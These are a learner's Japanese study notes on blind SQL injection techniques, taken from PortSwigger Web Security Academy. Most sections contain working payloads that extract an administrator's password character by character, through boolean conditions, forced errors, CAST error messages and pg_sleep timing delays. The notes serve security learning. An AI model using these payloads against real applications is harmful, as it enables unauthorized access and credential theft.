SQLiでは、直接結果が画面に表示されないとしても、SQLの条件によってアプリケーションのレスポンスに違いを発生させ、その違いから条件がTrueかFalseかを判断できる場合がある

### Password enumeration

条件がtrueの場合とfalseの場合でページの表示などに違いがあれば、その違いを利用して文字の推測ができる。
例えば、一文字ずつパスワードを推測する場合、

```
' AND SUBSTRING(
    (SELECT Password FROM Users WHERE Username = 'Administrator'),
    2,
    1
) > 'm'
```

このようなSQLを記述することがある。この例では、Administratorのパスワードの2文字目から1文字分取り出し、それが'm'よりも大きいかを判定している。

### Conditional response

#### TrackingIdへの入力

例えば、Cookieに以下のようなTrackingIdがある
`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`
この値がアプリケーション側でSQL文に使われていることがある。

```
SELECT TrackingId
FROM TrackedUsers
WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

このような場合に、入力した値によってSQLの条件を変更できる場合がある

### Conditional error

レスポンスの表示内容ではなく、条件によってSQLエラーを発生させることで、true/falseを判別する。

#### CASE WHEN

`CASE WHEN`を使用すると、if条件文のようにTrueとFalseで動作を変えることができる

例えば、

```

xyz' AND (
SELECT CASE
WHEN (1=2) THEN 1/0
ELSE 'a'
END
)='a

```

という式があった場合、1=2は常にfalseであるためELSE 'a'が選択される。そのため、'a' = 'a'となり、条件はTrueとなる。

一方、

```

xyz' AND (
SELECT CASE
WHEN (1=1) THEN 1/0
ELSE 'a'
END
)='a

```

の場合、1=1は常にTrueであるため、THEN 1/0が選択される。1/0は0による除算になるため、エラーが発生する。
このように、条件によって、正常なレスポンスもしくはエラーという異なる結果を発生させることで、SQLの条件がTrueかFalseかを判断することができる

これを応用し、

```
TrackingId=xyz' || (
    SELECT CASE
        WHEN SUBSTR(password,2,1)='a'
        THEN TO_CHAR(1/0)
        ELSE ''
    END
    FROM users
    WHERE username='administrator'
) || ''--
```

このようにWHENの条件を変更することで、条件がTrueの場合にのみエラーが発生する処理を実行できることがある。

###　Error-based SQLi
SQLのエラーメッセージ内に取得したいデータを表示できる可能性がある

```
TrackingId=' AND 1=CAST(
    (SELECT password FROM users LIMIT 1)
    AS int
)--
```

この記述の場合、取得した文字列であるpasswordをintに変換させようとしてエラーを発生させ、そのエラーメッセージ内にパスワードが含まれる場合がある。例として`ERROR: invalid input syntax for type integer: "ekci4rckrl"`といったメッセージがあげられる。
このコードにおける`LIMIT 1`は結果を最大1行に制限するものであり、この段階ではどの行が選択されるかは保証されないものの、`OFFSET`を使用することで対象行を指定することが可能となる。

### Time-based SQLi

SQLの条件によって処理時間に差を発生させ、その差から条件がTrueかfalseかを判断する。

```
SELECT CASE
    WHEN (SUBSTR(password, 1, 1)='a')
    THEN pg_sleep(10)
    ELSE pg_sleep(0)
END
FROM users
```

WHENにおける条件がTrueの場合pg_sleep(10),つまり10秒の遅延を発生させることで、レスポンス時間の違いから条件の結果を判断できる。
ただしこの遅延時間が短すぎる場合は通常の通信時間の揺らぎと区別しにくいため、ある程度の遅延の大きさが必要。

### TODO / Question

- `1/0`のほかにどのようなものでエラーを起こせるかを確認
- エラーを起こせたとしてもそれによってどこが変わるのかを確認する方法
- ||を使用してTrackingIdの後ろに文字列結合をする理由
- 使用するSQLの種類によっての記述方法の違い

### Notes

今回はパスワードを直接SELECT等で取得するのではなく、基本的に挙動の違いを観察することで1文字ずつ推測したり、エラーメッセージ等を利用して取得するという考え方を学んだ。
このノートは、PortSwigger Web Security Academyで学習した内容を自分の理解に基づいて整理したものである。
